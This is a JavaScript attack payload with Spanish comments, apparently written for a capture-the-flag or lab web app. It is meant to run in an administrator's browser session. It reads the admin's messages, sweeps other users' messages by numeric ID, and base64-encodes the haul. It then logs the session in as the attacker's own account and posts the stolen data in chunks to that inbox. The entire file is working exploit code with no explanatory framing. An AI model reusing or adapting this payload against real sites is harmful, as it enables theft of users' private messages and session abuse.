// navaja_final.js — lee mensajes como admin y te los publica en tu buzón
(async () => {
  const sleep = (ms) => new Promise(r => setTimeout(r, ms));

  // === AJUSTA ESTO ===
  const YOUR_USER = "insider1";
  const YOUR_PASS = "insideer";
  const MAX_ID    = 40;         // sube si quieres barrer más usuarios/IDs
  const CHUNK     = 900;        // tamaño de trozos

  try {
    // 1) dump "self" (admin) + barrido por id
    const hits = [];
    const self = await (await fetch('/messages', {credentials:'include'})).json().catch(()=>({messages:[]}));
    hits.push({id:"self", ...self});

    for (let id = 1; id <= MAX_ID; id++) {
      const r = await fetch(`/messages?id=${id}`, {credentials:'include'}).catch(()=>null);
      if (!r) continue;
      const j = await r.json().catch(()=>null);
      if (j && j.messages && j.messages.length) {
        hits.push({id, ...j});
      }
      await sleep(30);
    }

    const dump = btoa(unescape(encodeURIComponent(JSON.stringify({hits}))));

    // 2) pivota a tu usuario
    await fetch('/auth', {
      method: 'POST',
      headers: {'Content-Type':'application/x-www-form-urlencoded'},
      body: 'action=login&username='+encodeURIComponent(YOUR_USER)+'&password='+encodeURIComponent(YOUR_PASS)
    });

    await sleep(300);

    // 3) publica en trozos en tu buzón
    for (let i = 0, p = 0; i < dump.length; i += CHUNK, p++) {
      await fetch('/create_msg', {
        method: 'POST',
        headers: {'Content-Type':'application/json'},
        body: JSON.stringify({ message: `EXFIL_B64_${p}: ` + dump.slice(i, i + CHUNK) })
      });
      await sleep(60);
    }
  } catch (e) {
    try {
      await fetch('/create_msg', {
        method: 'POST',
        headers: {'Content-Type':'application/json'},
        body: JSON.stringify({ message: `EXFIL_ERR: ${String(e)}` })
      });
    } catch(_) {}
  }
})();
